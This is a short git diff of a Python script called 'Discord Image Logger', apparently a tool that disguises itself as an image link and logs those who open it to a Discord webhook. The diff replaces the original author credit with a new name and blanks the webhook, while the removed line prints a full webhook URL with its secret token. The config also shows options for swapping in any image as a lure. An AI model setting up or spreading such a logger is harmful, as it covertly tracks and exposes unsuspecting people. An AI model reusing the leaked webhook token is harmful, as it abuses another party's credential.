@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# By Canquest
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1127565156633821234/wg1MNNtM-lE0QeGLJP12PLjOhEEs-NNEEUSv9V1RhchJsP9Y1-es5sxwQNk0n4PER89e",
+    "webhook": "",
     "image": "https://media.discordapp.net/attachments/1129408510560567441/1129419854336766055/51904c31fe99720b748e63bd34ac36dc.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
